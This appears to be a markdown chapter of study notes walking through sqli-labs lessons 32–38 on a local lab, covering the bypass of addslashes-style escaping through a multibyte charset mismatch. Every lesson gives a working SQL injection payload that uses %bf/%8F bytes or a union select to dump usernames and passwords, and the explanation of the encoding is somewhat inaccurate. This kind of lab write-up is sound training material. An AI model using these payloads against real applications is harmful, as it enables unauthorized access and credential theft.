# Chapter-11

This chapter covers the last topic taught in the sqli-labs video series. 

## Bypassing addslashes - charset Mismatch

There are ways by which the developer can prevent an attacker from injecting backslashes by sanitizing the query. 

Here is a ```php``` code snippet that does the same - 

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    
    return $string;
}
```

In such cases adding a ```'``` or ````"``` or ```\``` to the query will be pointless. 

However we can still bypass this check by manipulating the encoding of the text. 

The above code snippet will remove all occurrences of 8-bit acsii characters but it will not be able to do anything with 16 or 32 bit character encoding. 

There we can inject a 16-bit or 32-bit encoded payloads to the query. 

:warning: The maximum value for ascii in hex is ```7F```. Therefore using any value greater than that can break the query. 

## Lesson 32 

In this challenge, all single quotes, double quotes and backslashes are being escaped. 

In order to bypass this, we can inject values greater that ```7F``` in ascii followed by our payload. 

The url for this challenge will look somewhat like this - 

```
http://localhost/sqlilabs/Less-32/?id=-2%8F' union select 1, group_concat(username), group_concat(password)  from users limit 1--+
```

## Lesson 33

This challenge is pretty much the same as the previous challenge. 

The url for this challenge will look somewhat like this - 

```
http://localhost/sqlilabs/Less-33/?id=-1%8F' union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

## Lesson 34

Look [here](#) before attempting this challenge.

Here the login page escapes single quotes, double quotes and backslashes. 

We can bypass this by passing the following to the username field - 

```
admin%bf' or 1 #
```

Now in order to get all the usernames and passwords we can inject the following into the input field - 

```
admin%bf' union select group_concat(username), group_concat(password) from users limit 0, 1 #
```

:warning: Solving this challenge in ```Burp suite``` makes it a lot easier.

:boom: If you are get any mysql errors when the above payload is used in the input field in ```Burp```, please have a look at the encoding of the payload.

## Lesson 35 

This one is a bit tricky as we might miss the obvious. 

We can solve this challenge by not breaking the query. This is a simple direct injection. 

The url will look somewhat like this - 

```
http://localhost/sqlilabs/Less-35/?id=-1 union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

## Lesson 36

This one quite simple. This is exactly the same as lesson 32.

The url is as follows - 

```
http://localhost/sqlilabs/Less-36/?id=-4%bf' union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

## Lesson 37

This is exactly the same as lesson 34. 

We can exploit the website by passing the following in the input field -

```
admin%bf' union select group_concat(username), group_concat(password) from users limit 0, 1 #
```

:warning: ```Burp``` suite can be used to simplify this challenge.

## Lesson 38

This is a rather simple challenge. 

The url for this challenge is as follows -

```
http://localhost/sqlilabs/Less-38/?id=-1' union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

:star2: Yaaaaay! This was the last challenge in the advanced section of ```sqli-labs```. 